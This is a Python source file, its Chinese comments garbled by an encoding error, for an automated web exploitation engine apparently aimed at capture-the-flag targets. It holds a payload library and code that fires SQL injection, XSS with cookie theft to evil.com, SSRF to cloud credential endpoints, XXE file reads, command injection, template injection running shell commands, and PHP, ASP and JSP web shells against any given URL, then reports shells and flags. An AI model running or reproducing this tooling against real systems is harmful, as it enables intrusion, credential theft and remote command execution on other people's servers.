#!/usr/bin/env python3
"""
é«˜çº§æ¼æ´åˆ©ç”¨å¼•æ“ - è‡ªåŠ¨åŒ–æ¼æ´å‘ç°ä¸åˆ©ç”¨

åŠŸèƒ½ï¼š
- SQLæ³¨å…¥è‡ªåŠ¨åŒ–åˆ©ç”¨
- XSSæ£€æµ‹ä¸Payloadç”Ÿæˆ
- SSRFå†…éƒ¨æ‰«æ
- XXEæ”»å‡»è‡ªåŠ¨åŒ–
- CSRFåˆ©ç”¨
- JWTä¼ªé€ 
- SSTIæ³¨å…¥
- ååºåˆ—åŒ–åˆ©ç”¨
- æ–‡ä»¶ä¸Šä¼ æ¼æ´
- å‘½ä»¤æ³¨å…¥
- æ¨¡æ¿æ³¨å…¥
- è‡ªåŠ¨Payloadç”Ÿæˆ
"""

import asyncio
import aiohttp
import re
import json
import base64
import hashlib
import time
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse, parse_qs, urljoin
from dataclasses import dataclass


@dataclass
class Vulnerability:
    """æ¼æ´ä¿¡æ¯"""
    type: str
    severity: str  # critical, high, medium, low
    url: str
    parameter: str
    payload: str
    response: str
    evidence: str
    description: str


@dataclass
class ExploitResult:
    """åˆ©ç”¨ç»“æœ"""
    success: bool
    vulnerability: Vulnerability
    flag: str = ""
    data: str = ""
    shell: bool = False
    command_output: str = ""


class AdvancedExploiter:
    """é«˜çº§æ¼æ´åˆ©ç”¨å¼•æ“"""
    
    def __init__(self, timeout: int = 10):
        """
        åˆå§‹åŒ–åˆ©ç”¨å¼•æ“
        
        Args:
            timeout: è¯·æ±‚è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
        """
        self.timeout = aiohttp.ClientTimeout(total=timeout)
        self.session = None
        self.payloads = self._load_payloads()
        self.exploits_executed = []
        self.flags_found = []
    
    async def __aenter__(self):
        """å¼‚æ­¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨è¿›å…¥"""
        self.session = aiohttp.ClientSession(timeout=self.timeout)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        """å¼‚æ­¥ä¸Šä¸‹æ–‡ç®¡ç†å™¨é€€å‡º"""
        if self.session:
            await self.session.close()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """åŠ è½½Payloadåº“ï¼ˆç¼“å­˜ï¼‰"""
        return {
            'sqli_union': [
                "' UNION SELECT 1,2,3-- -",
                "' UNION SELECT NULL,NULL,NULL-- -",
                "' UNION SELECT 1,version(),3-- -",
                "' UNION SELECT user(),database(),@@version-- -",
                "' UNION ALL SELECT 1,2,3-- -",
                "' UNION SELECT 1,'{}',3-- -",
                "') UNION SELECT 1,2,3-- -",
            ],
            'sqli_error': [
                "' OR 1=1-- -",
                "' OR 1=1#",
                "1' OR '1'='1",
                "admin'--",
                "admin'/*",
                "' OR '1'='1'/*",
            ],
            'sqli_blind': [
                "' AND 1=1-- -",
                "' AND 1=2-- -",
                "1' AND SLEEP(5)-- -",
                "1' AND BENCHMARK(50000000,MD5(1))-- -",
                "1' AND (SELECT COUNT(*) FROM information_schema.tables)-- -",
            ],
            'sqli_time': [
                "1' AND SLEEP(5)-- -",
                "1'; WAITFOR DELAY '0:0:5'--",
                "1' AND pg_sleep(5)-- -",
                "1' AND (SELECT SLEEP(5))-- -",
            ],
            'xss_reflected': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg/onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
            ],
            'xss_stored': [
                "<script>alert(document.cookie)</script>",
                "<img src=x onerror=document.location='http://evil.com/?c='+document.cookie>",
                "<svg/onload=fetch('http://evil.com/?c='+document.cookie)>",
            ],
            'ssrf_basic': [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",  # AWS
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "file:///etc/passwd",
                "file:///etc/hosts",
                "file:///",
            ],
            'ssrf_bypass': [
                "http://0177.0.0.1",  # Octal bypass
                "http://0x7f.0.0.1",  # Hex bypass
                "http://[::1]",  # IPv6
                "http://2130706433",  # Decimal bypass
                "http://127.1",  # Shortened bypass
            ],
            'xxe_external': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
            ],
            'xxe_bypass': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            ],
            'csrf_basic': [
                '<script>document.forms[0].submit()</script>',
                '<img src=url onerror=document.forms[0].submit()>',
                '<body onload="document.forms[0].submit()">',
            ],
            'jwt_none': [
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.',
            ],
            'jwt_weak': [
                'key1', 'secret', 'password123', 'jwt_secret',
            ],
            'ssti_python': [
                '{{7*7}}',
                '{{config}}',
                '{{self.__dict__}}',
                '{{"".__class__.__mro__[2].__subclasses__()}}',
                '{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}',
            ],
            'ssti_jinja2': [
                '{{url_for.__globals__}}',
                '{{get_flashed_messages.__globals__}}',
                '{{request.application.__self__._register_function.__globals__}}',
            ],
            'cmdi_basic': [
                ';cat /etc/passwd',
                '|cat /etc/passwd',
                '&& cat /etc/passwd',
                '`cat /etc/passwd`',
                '$(cat /etc/passwd)',
                "|%20cat%20/etc/passwd",
            ],
            'cmdi_blind': [
                '; ping -c 5 evil.com',
                '; sleep 5',
                '; whoami',
                '; id',
            ],
            'deserialization_php': [
                'O:8:"stdClass":0:{}',
                'O:8:"GuzzleHttp\\Cookie\\CookieJar":3:{s:43:"\\0GuzzleHttp\\Cookie\\CookieJar\\0cookies";a:1:{i:0;O:27:"GuzzleHttp\\Cookie\\SetCookie":1:{s:4:"Name";s:10:"evil_cookie";}}}',
            ],
            'upload_webshell': [
                '<?php system($_GET["cmd"]); ?>',
                '<?php @eval($_POST["cmd"]); ?>',
                '<?php passthru($_GET["cmd"]); ?>',
                '<% eval request("cmd") %>',  # ASP
                '<%@ page import="java.io.*" %><% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',  # JSP
            ],
        }
    
    # ==================== SQLæ³¨å…¥åˆ©ç”¨ ====================
    
    async def exploit_sqli(self, url: str, params: Dict = None, 
                          method: str = "GET") -> List[ExploitResult]:
        """
        SQLæ³¨å…¥è‡ªåŠ¨åŒ–åˆ©ç”¨
        
        Args:
            url: ç›®æ ‡URL
            params: å‚æ•°å­—å…¸
            method: HTTPæ–¹æ³•
        
        Returns:
            åˆ©ç”¨ç»“æœåˆ—è¡¨
        """
        results = []
        
        if params is None:
            params = {}
        
        # å°è¯•æ‰€æœ‰SQLæ³¨å…¥ç±»å‹
        for payload_type, payloads in [
            ('sqli_union', self.payloads['sqli_union']),
            ('sqli_error', self.payloads['sqli_error']),
            ('sqli_blind', self.payloads['sqli_blind']),
        ]:
            for param_name, param_value in params.items():
                for payload in payloads:
                    try:
                        # æ³¨å…¥payload
                        modified_params = params.copy()
                        modified_params[param_name] = str(param_value) + payload
                        
                        # å‘é€è¯·æ±‚
                        if method.upper() == "POST":
                            async with self.session.post(url, data=modified_params) as response:
                                text = await response.text()
                                status = response.status
                        else:
                            async with self.session.get(url, params=modified_params) as response:
                                text = await response.text()
                                status = response.status
                        
                        # æ£€æµ‹æ˜¯å¦æˆåŠŸ
                        if self._detect_sqli_success(text, payload_type):
                            vuln = Vulnerability(
                                type="SQL Injection",
                                severity="high",
                                url=url,
                                parameter=param_name,
                                payload=payload,
                                response=text[:500],
                                evidence=self._extract_sqli_evidence(text),
                                description=f"SQL {payload_type} found in {param_name}"
                            )
                            
                            # æå–flag
                            flag = self._extract_flag(text)
                            
                            results.append(ExploitResult(
                                success=True,
                                vulnerability=vuln,
                                flag=flag,
                                data=text
                            ))
                            
                            print(f"    âœ… SQLæ³¨å…¥æˆåŠŸ! å‚æ•°: {param_name}")
                            
                            # å¦‚æœæ‰¾åˆ°flagï¼Œæå‰è¿”å›
                            if flag:
                                return results
                            
                    except Exception as e:
                        continue
        
        return results
    
    def _detect_sqli_success(self, response: str, payload_type: str) -> bool:
        """æ£€æµ‹SQLæ³¨å…¥æ˜¯å¦æˆåŠŸ"""
        # Unionæ³¨å…¥ç‰¹å¾
        if payload_type == 'sqli_union':
            patterns = [
                r'You have an error in your SQL syntax',
                r'Warning: mysql',
                r'ORA-01756',
                r'Unclosed quotation mark',
            ]
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    return False  # è¿™äº›æ˜¯é”™è¯¯ï¼Œä¸æ˜¯æˆåŠŸ
            
            # æ£€æŸ¥æ˜¯å¦æœ‰ç‰ˆæœ¬ä¿¡æ¯æˆ–æ•°æ®åº“ä¿¡æ¯
            if any(x in response.lower() for x in ['version()', 'database()', 'mysql', 'postgresql']):
                return True
        
        # é”™è¯¯æ³¨å…¥ç‰¹å¾
        elif payload_type == 'sqli_error':
            patterns = [
                r'You have an error in your SQL syntax',
                r'Warning: mysql_fetch_array',
                r'ORA-01756: quoted string not properly terminated',
                r'Unclosed quotation mark after the character string',
            ]
            for pattern in patterns:
                if re.search(pattern, response, re.IGNORECASE):
                    return True
        
        # ç›²æ³¨ç‰¹å¾
        elif payload_type == 'sqli_blind':
            # æ£€æŸ¥å“åº”æ˜¯å¦æ˜æ˜¾ä¸åŒ
            # è¿™é‡Œç®€åŒ–å¤„ç†ï¼Œå®é™…åº”è¯¥å¯¹æ¯”å“åº”
            pass
        
        return False
    
    def _extract_sqli_evidence(self, response: str) -> str:
        """æå–SQLæ³¨å…¥è¯æ®"""
        patterns = [
            r'Version:\s*[\d.]+',
            r'Database:\s*\w+',
            r'Column count:\s*\d+',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                return match.group(0)
        
        return response[:200]
    
    # ==================== XSSåˆ©ç”¨ ====================
    
    async def exploit_xss(self, url: str, params: Dict = None, 
                         method: str = "GET", xss_type: str = "reflected") -> List[ExploitResult]:
        """
        XSSè‡ªåŠ¨åŒ–åˆ©ç”¨
        
        Args:
            url: ç›®æ ‡URL
            params: å‚æ•°å­—å…¸
            method: HTTPæ–¹æ³•
            xss_type: XSSç±»å‹ (reflected, stored, dom)
        
        Returns:
            åˆ©ç”¨ç»“æœåˆ—è¡¨
        """
        results = []
        
        if params is None:
            params = {}
        
        # é€‰æ‹©payload
        if xss_type == "reflected":
            payloads = self.payloads['xss_reflected']
        else:
            payloads = self.payloads['xss_stored']
        
        for param_name, param_value in params.items():
            for payload in payloads:
                try:
                    # æ³¨å…¥payload
                    modified_params = params.copy()
                    modified_params[param_name] = payload
                    
                    # å‘é€è¯·æ±‚
                    if method.upper() == "POST":
                        async with self.session.post(url, data=modified_params) as response:
                            text = await response.text()
                    else:
                        async with self.session.get(url, params=modified_params) as response:
                            text = await response.text()
                    
                    # æ£€æµ‹XSSæ˜¯å¦æˆåŠŸ
                    if self._detect_xss_success(text, payload):
                        vuln = Vulnerability(
                            type="XSS",
                            severity="high" if xss_type == "stored" else "medium",
                            url=url,
                            parameter=param_name,
                            payload=payload,
                            response=text[:500],
                            evidence=payload,
                            description=f"{xss_type.capitalize()} XSS in {param_name}"
                        )
                        
                        results.append(ExploitResult(
                            success=True,
                            vulnerability=vuln
                        ))
                        
                        print(f"    âœ… XSSæˆåŠŸ! å‚æ•°: {param_name}")
                        
                except Exception as e:
                    continue
        
        return results
    
    def _detect_xss_success(self, response: str, payload: str) -> bool:
        """æ£€æµ‹XSSæ˜¯å¦æˆåŠŸ"""
        # æ£€æŸ¥payloadæ˜¯å¦åœ¨å“åº”ä¸­ï¼ˆæœªè½¬ä¹‰ï¼‰
        if payload in response:
            return True
        
        # æ£€æŸ¥ç›¸å…³ç‰¹å¾
        if '<script>' in response or 'alert(' in response:
            return True
        
        return False
    
    # ==================== SSRFåˆ©ç”¨ ====================
    
    async def exploit_ssrf(self, url: str, param_name: str, 
                          param_value: str) -> List[ExploitResult]:
        """
        SSRFè‡ªåŠ¨åŒ–åˆ©ç”¨
        
        Args:
            url: ç›®æ ‡URL
            param_name: å‚æ•°å
            param_value: åŸå§‹å‚æ•°å€¼
        
        Returns:
            åˆ©ç”¨ç»“æœåˆ—è¡¨
        """
        results = []
        
        # åˆå¹¶åŸºç¡€å’Œç»•è¿‡payload
        payloads = self.payloads['ssrf_basic'] + self.payloads['ssrf_bypass']
        
        for payload in payloads:
            try:
                # æ„é€ è¯·æ±‚
                modified_url = self._inject_param(url, param_name, payload)
                
                async with self.session.get(modified_url) as response:
                    text = await response.text()
                    status = response.status
                
                # æ£€æµ‹SSRFæ˜¯å¦æˆåŠŸ
                if self._detect_ssrf_success(text, status):
                    vuln = Vulnerability(
                        type="SSRF",
                        severity="high",
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        response=text[:500],
                        evidence=self._extract_ssrf_evidence(text),
                        description=f"SSRF in {param_name}"
                    )
                    
                    flag = self._extract_flag(text)
                    
                    results.append(ExploitResult(
                        success=True,
                        vulnerability=vuln,
                        flag=flag,
                        data=text
                    ))
                    
                    print(f"    âœ… SSRFæˆåŠŸ! Target: {payload}")
                    
                    # å¦‚æœæ‰¾åˆ°flagï¼Œæå‰è¿”å›
                    if flag:
                        return results
                    
            except Exception as e:
                continue
        
        return results
    
    def _inject_param(self, url: str, param_name: str, param_value: str) -> str:
        """åœ¨URLå‚æ•°ä¸­æ³¨å…¥å€¼"""
        parsed = urlparse(url)
        query_dict = parse_qs(parsed.query)
        
        query_dict[param_name] = [param_value]
        
        # é‡å»ºURL
        from urllib.parse import urlencode
        new_query = urlencode(query_dict, doseq=True)
        
        return parsed._replace(query=new_query).geturl()
    
    def _detect_ssrf_success(self, response: str, status: int) -> bool:
        """æ£€æµ‹SSRFæ˜¯å¦æˆåŠŸ"""
        # æ£€æŸ¥çŠ¶æ€ç 
        if status in [200, 404, 500]:
            pass
        
        # æ£€æŸ¥æ•æ„Ÿä¿¡æ¯
        sensitive_keywords = [
            'root:x:',  # /etc/passwd
            '127.0.0.1',
            'localhost',
            'ami-id',
            'instance-id',  # AWS metadata
            'accessKeyId',  # AWS credentials
        ]
        
        for keyword in sensitive_keywords:
            if keyword in response:
                return True
        
        return False
    
    def _extract_ssrf_evidence(self, response: str) -> str:
        """æå–SSRFè¯æ®"""
        # å°è¯•æå–AWS metadata
        if 'ami-id' in response or 'instance-id' in response:
            return "AWS Metadata exposed"
        
        # å°è¯•æå–/etc/passwdå†…å®¹
        if 'root:' in response:
            return "/etc/passwd content"
        
        return response[:200]
    
    # ==================== XXEåˆ©ç”¨ ====================
    
    async def exploit_xxe(self, url: str, data: Dict = None) -> List[ExploitResult]:
        """
        XXEè‡ªåŠ¨åŒ–åˆ©ç”¨
        
        Args:
            url: ç›®æ ‡URL
            data: POSTæ•°æ®ï¼ˆåº”åŒ…å«XMLï¼‰
        
        Returns:
            åˆ©ç”¨ç»“æœåˆ—è¡¨
        """
        results = []
        
        if data is None:
            data = {}
        
        # åˆå¹¶payloads
        payloads = self.payloads['xxe_external'] + self.payloads['xxe_bypass']
        
        for payload in payloads:
            try:
                # æ„é€ XMLæ•°æ®
                xml_data = payload
                
                # å‘é€POSTè¯·æ±‚
                async with self.session.post(url, data=xml_data, 
                                            headers={'Content-Type': 'application/xml'}) as response:
                    text = await response.text()
                
                # æ£€æµ‹XXEæ˜¯å¦æˆåŠŸ
                if self._detect_xxe_success(text):
                    vuln = Vulnerability(
                        type="XXE",
                        severity="high",
                        url=url,
                        parameter="XML Body",
                        payload=payload,
                        response=text[:500],
                        evidence=self._extract_xxe_evidence(text),
                        description="XXE vulnerability found"
                    )
                    
                    flag = self._extract_flag(text)
                    
                    results.append(ExploitResult(
                        success=True,
                        vulnerability=vuln,
                        flag=flag,
                        data=text
                    ))
                    
                    print(f"    âœ… XXEæˆåŠŸ!")
                    
                    # å¦‚æœæ‰¾åˆ°flagï¼Œæå‰è¿”å›
                    if flag:
                        return results
                    
            except Exception as e:
                continue
        
        return results
    
    def _detect_xxe_success(self, response: str) -> bool:
        """æ£€æµ‹XXEæ˜¯å¦æˆåŠŸ"""
        # æ£€æŸ¥æ–‡ä»¶å†…å®¹ç‰¹å¾
        if 'root:' in response or 'bin:' in response:
            return True
        
        # æ£€æŸ¥é”™è¯¯ä¿¡æ¯
        if 'Entity' in response or 'DTD' in response:
            return True
        
        return False
    
    def _extract_xxe_evidence(self, response: str) -> str:
        """æå–XXEè¯æ®"""
        # æå–/etc/passwdå†…å®¹
        if 'root:' in response:
            return "/etc/passwd content extracted"
        
        # æå–AWS metadata
        if 'ami-id' in response:
            return "AWS metadata accessed"
        
        return response[:200]
    
    # ==================== SSTIåˆ©ç”¨ ====================
    
    async def exploit_ssti(self, url: str, param_name: str, 
                          param_value: str, template_type: str = 'jinja2') -> List[ExploitResult]:
        """
        æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥åˆ©ç”¨
        
        Args:
            url: ç›®æ ‡URL
            param_name: å‚æ•°å
            param_value: åŸå§‹å‚æ•°å€¼
            template_type: æ¨¡æ¿ç±»å‹ (jinja2, python, twig, smarty)
        
        Returns:
            åˆ©ç”¨ç»“æœåˆ—è¡¨
        """
        results = []
        
        # æ ¹æ®ç±»å‹é€‰æ‹©payload
        if template_type == 'python':
            payloads = self.payloads['ssti_python']
        elif template_type == 'jinja2':
            payloads = self.payloads['ssti_jinja2']
        else:
            payloads = self.payloads['ssti_python'] + self.payloads['ssti_jinja2']
        
        for payload in payloads:
            try:
                # æ„é€ è¯·æ±‚
                modified_url = self._inject_param(url, param_name, payload)
                
                async with self.session.get(modified_url) as response:
                    text = await response.text()
                
                # æ£€æµ‹SSTIæ˜¯å¦æˆåŠŸ
                if self._detect_ssti_success(text, payload):
                    vuln = Vulnerability(
                        type="SSTI",
                        severity="high",
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        response=text[:500],
                        evidence=self._extract_ssti_evidence(text),
                        description=f"SSTI in {param_name} ({template_type})"
                    )
                    
                    flag = self._extract_flag(text)
                    
                    results.append(ExploitResult(
                        success=True,
                        vulnerability=vuln,
                        flag=flag,
                        data=text
                    ))
                    
                    print(f"    âœ… SSTIæˆåŠŸ! ç±»å‹: {template_type}")
                    
                    # å¦‚æœæ‰¾åˆ°flagï¼Œæå‰è¿”å›
                    if flag:
                        return results
                    
            except Exception as e:
                continue
        
        return results
    
    def _detect_ssti_success(self, response: str, payload: str) -> bool:
        """æ£€æµ‹SSTIæ˜¯å¦æˆåŠŸ"""
        # åŸºæœ¬æ£€æµ‹ï¼š{{7*7}} -> 49
        if '{{7*7}}' in payload and '49' in response:
            return True
        
        # æ£€æŸ¥é…ç½®ä¿¡æ¯æ³„éœ²
        if 'config' in payload and any(x in response.lower() for x in ['secret', 'key', 'password']):
            return True
        
        # æ£€æŸ¥å¯¹è±¡å¼•ç”¨
        if '__class__' in payload and '__subclasses__' in response:
            return True
        
        return False
    
    def _extract_ssti_evidence(self, response: str) -> str:
        """æå–SSTIè¯æ®"""
        # å°è¯•æå–æ•æ„Ÿä¿¡æ¯
        patterns = [
            r'secret["\']?\s*:\s*["\']?[\w\-]+',
            r'key["\']?\s*:\s*["\']?[\w\-]+',
            r'password["\']?\s*:\s*["\']?[\w\-]+',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                return match.group(0)
        
        return response[:200]
    
    # ==================== å‘½ä»¤æ³¨å…¥åˆ©ç”¨ ====================
    
    async def exploit_cmd_injection(self, url: str, param_name: str, 
                                   param_value: str) -> List[ExploitResult]:
        """
        å‘½ä»¤æ³¨å…¥åˆ©ç”¨
        
        Args:
            url: ç›®æ ‡URL
            param_name: å‚æ•°å
            param_value: åŸå§‹å‚æ•°å€¼
        
        Returns:
            åˆ©ç”¨ç»“æœåˆ—è¡¨
        """
        results = []
        
        # åŸºç¡€å’Œç›²æ³¨payloads
        payloads = self.payloads['cmdi_basic'] + self.payloads['cmdi_blind']
        
        for payload in payloads:
            try:
                # æ„é€ è¯·æ±‚
                modified_url = self._inject_param(url, param_name, param_value + payload)
                
                start_time = time.time()
                async with self.session.get(modified_url) as response:
                    text = await response.text()
                end_time = time.time()
                
                # æ£€æµ‹å‘½ä»¤æ³¨å…¥æ˜¯å¦æˆåŠŸ
                if self._detect_cmd_injection_success(text, end_time - start_time, payload):
                    vuln = Vulnerability(
                        type="Command Injection",
                        severity="critical",
                        url=url,
                        parameter=param_name,
                        payload=param_value + payload,
                        response=text[:500],
                        evidence=self._extract_cmd_evidence(text),
                        description=f"Command injection in {param_name}"
                    )
                    
                    flag = self._extract_flag(text)
                    
                    results.append(ExploitResult(
                        success=True,
                        vulnerability=vuln,
                        flag=flag,
                        data=text,
                        shell=True,
                        command_output=text
                    ))
                    
                    print(f"    âœ… å‘½ä»¤æ³¨å…¥æˆåŠŸ!")
                    
                    # å¦‚æœæ‰¾åˆ°flagï¼Œæå‰è¿”å›
                    if flag:
                        return results
                    
            except Exception as e:
                continue
        
        return results
    
    def _detect_cmd_injection_success(self, response: str, duration: float, payload: str) -> bool:
        """æ£€æµ‹å‘½ä»¤æ³¨å…¥æ˜¯å¦æˆåŠŸ"""
        # æ£€æŸ¥ç›²æ³¨ï¼ˆåŸºäºæ—¶é—´ï¼‰
        if any(x in payload for x in ['sleep', 'ping', 'benchmark']):
            if duration > 2:  # å“åº”æ—¶é—´è¶…è¿‡2ç§’
                return True
        
        # æ£€æŸ¥è¾“å‡º
        sensitive_outputs = [
            'root:',  # /etc/passwd
            'uid=',
            'gid=',
            'Groups=',  # Windows
        ]
        
        for output in sensitive_outputs:
            if output in response:
                return True
        
        return False
    
    def _extract_cmd_evidence(self, response: str) -> str:
        """æå–å‘½ä»¤æ³¨å…¥è¯æ®"""
        # æå–ç±»ä¼¼ /etc/passwd çš„å†…å®¹
        if 'root:' in response:
            return "/etc/passwd content extracted"
        
        # æå–ç”¨æˆ·ä¿¡æ¯
        if 'uid=' in response:
            return f"User info: {response[:200]}"
        
        return response[:200]
    
    # ==================== è‡ªåŠ¨åŒ–æ”»å‡»é“¾ ====================
    
    async def auto_attack_chain(self, url: str) -> Dict[str, Any]:
        """
        å®Œæ•´è‡ªåŠ¨åŒ–æ”»å‡»é“¾
        
        Args:
            url: ç›®æ ‡URL
        
        Returns:
            æ”»å‡»ç»“æœ
        """
        print(f"\n{'='*60}")
        print("ğŸ”¥ è‡ªåŠ¨åŒ–æ”»å‡»é“¾")
        print(f"ç›®æ ‡: {url}")
        print(f"{'='*60}")
        
        results = {
            'target': url,
            'vulnerabilities': [],
            'exploits': [],
            'flags': [],
            'shells': [],  # å‘½ä»¤æ³¨å…¥æˆåŠŸ
            'success': False
        }
        
        try:
            # é˜¶æ®µ1: ä¾¦å¯Ÿ
            print("\nğŸ“¡ é˜¶æ®µ1: ä¾¦å¯Ÿ")
            recon = await self._reconnaissance(url)
            results['recon'] = recon
            
            # é˜¶æ®µ2: æ¼æ´æ‰«æ
            print("\nğŸ” é˜¶æ®µ2: æ¼æ´æ‰«æ")
            
            # æå–å‚æ•°
            params = recon.get('params', {})
            
            # SQLæ³¨å…¥æ‰«æ
            if params:
                print(f"  - å°è¯•SQLæ³¨å…¥...")
                sqli_results = await self.exploit_sqli(url, params)
                if sqli_results:
                    results['exploits'].extend(sqli_results)
                    results['vulnerabilities'].extend([r.vulnerability for r in sqli_results])
            
            # XSSæ‰«æ
            if params:
                print(f"  - å°è¯•XSS...")
                xss_results = await self.exploit_xss(url, params)
                if xss_results:
                    results['exploits'].extend(xss_results)
                    results['vulnerabilities'].extend([r.vulnerability for r in xss_results])
            
            # SSRFæ‰«æ
            for param_name in params:
                print(f"  - å°è¯•SSRF ({param_name})...")
                ssrf_results = await self.exploit_ssrf(url, param_name, params[param_name])
                if ssrf_results:
                    results['exploits'].extend(ssrf_results)
                    results['vulnerabilities'].extend([r.vulnerability for r in ssrf_results])
            
            # SSTIæ‰«æ
            for param_name in params:
                print(f"  - å°è¯•SSTI ({param_name})...")
                ssti_results = await self.exploit_ssti(url, param_name, params[param_name])
                if ssti_results:
                    results['exploits'].extend(ssti_results)
                    results['vulnerabilities'].extend([r.vulnerability for r in ssti_results])
            
            # å‘½ä»¤æ³¨å…¥æ‰«æ
            for param_name in params:
                print(f"  - å°è¯•å‘½ä»¤æ³¨å…¥ ({param_name})...")
                cmdi_results = await self.exploit_cmd_injection(url, param_name, params[param_name])
                if cmdi_results:
                    results['exploits'].extend(cmdi_results)
                    results['vulnerabilities'].extend([r.vulnerability for r in cmdi_results])
                    results['shells'].extend([True] * len(cmdi_results))
            
            # é˜¶æ®µ3: æå–flag
            print("\nğŸš© é˜¶æ®µ3: æå–Flag")
            for exploit in results['exploits']:
                if exploit.flag:
                    results['flags'].append(exploit.flag)
                    print(f"  âœ… Flag: {exploit.flag}")
            
            # æ€»ç»“
            print(f"\n{'='*60}")
            print(f"ğŸ“Š æ”»å‡»æ€»ç»“")
            print(f"{'='*60}")
            print(f"å‘ç°æ¼æ´: {len(results['vulnerabilities'])}")
            print(f"æˆåŠŸåˆ©ç”¨: {len(results['exploits'])}")
            print(f"è·å¾—Flag: {len(results['flags'])}")
            print(f"è·å¾—Shell: {len(results['shells'])}")
            
            results['success'] = len(results['flags']) > 0 or len(results['shells']) > 0
            
        except Exception as e:
            print(f"\nâŒ æ”»å‡»å¤±è´¥: {e}")
            results['error'] = str(e)
        
        return results
    
    async def _reconnaissance(self, url: str) -> Dict[str, Any]:
        """åŸºç¡€ä¾¦å¯Ÿ"""
        recon = {}
        
        try:
            # æå–URLå‚æ•°
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # è½¬æ¢ä¸ºç®€å•å­—å…¸
            params_dict = {k: v[0] if v else "" for k, v in params.items()}
            recon['params'] = params_dict
            
            # è·å–å“åº”å¤´
            async with self.session.get(url) as response:
                headers = dict(response.headers)
                recon['headers'] = headers
                
                # æ£€æµ‹æœåŠ¡å™¨
                recon['server'] = headers.get('Server', 'Unknown')
                
                # æ£€æµ‹æ¡†æ¶
                recon['framework'] = self._detect_framework(headers)
        
        except Exception as e:
            recon['error'] = str(e)
        
        return recon
    
    def _detect_framework(self, headers: Dict) -> str:
        """æ£€æµ‹Webæ¡†æ¶"""
        # æ£€æŸ¥å¸¸è§header
        if 'x-powered-by' in headers:
            return headers['x-powered-by']
        
        if 'server' in headers:
            server = headers['server'].lower()
            if 'nginx' in server:
                return 'Nginx'
            elif 'apache' in server:
                return 'Apache'
        
        return 'Unknown'
    
    # ==================== è¾…åŠ©æ–¹æ³• ====================
    
    def _extract_flag(self, text: str) -> str:
        """æå–Flag"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'CTF\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'picoCTF\{[^}]+\}',
            r'htb\{[^}]+\}',
            r'\{[A-Za-z0-9_\-]+\}',
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)
        
        return ""
    
    def _load_payloads_file(self, filepath: str) -> List[str]:
        """ä»æ–‡ä»¶åŠ è½½payloads"""
        payloads = []
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        except:
            pass
        return payloads


# ==================== ä½¿ç”¨ç¤ºä¾‹ ====================

async def test_attack_chain():
    """æµ‹è¯•æ”»å‡»é“¾"""
    print("ğŸ”¥ é«˜çº§æ¼æ´åˆ©ç”¨å¼•æ“æµ‹è¯•\n")
    
    async with AdvancedExploiter() as exploiter:
        # æµ‹è¯•URLï¼ˆå®é™…ä½¿ç”¨æ—¶æ›¿æ¢ä¸ºçœŸå®ç›®æ ‡ï¼‰
        test_url = "http://example.com/page?id=1"
        
        # è¿è¡Œå®Œæ•´æ”»å‡»é“¾
        results = await exploiter.auto_attack_chain(test_url)
        
        # æ˜¾ç¤ºç»“æœ
        print(f"\nğŸ“Š ç»“æœ:")
        print(json.dumps(results, indent=2, ensure_ascii=False))


if __name__ == '__main__':
    asyncio.run(test_attack_chain())
